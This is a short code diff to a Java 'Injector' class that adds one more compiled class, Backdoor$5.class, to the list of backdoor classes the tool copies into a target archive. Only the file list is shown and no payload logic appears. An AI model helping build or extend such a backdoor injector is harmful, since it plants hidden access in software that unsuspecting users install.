@@ -148,6 +148,7 @@ public class Injector {
                 outStream.getPath("/com/thiccindustries/backdoor/Backdoor$2.class"),
                 outStream.getPath("/com/thiccindustries/backdoor/Backdoor$3.class"),
                 outStream.getPath("/com/thiccindustries/backdoor/Backdoor$4.class"),
+                outStream.getPath("/com/thiccindustries/backdoor/Backdoor$5.class"),
                 outStream.getPath("/com/thiccindustries/backdoor/Config.class"),
                 outStream.getPath("/com/thiccindustries/backdoor/Config$HelpItem.class")
         };
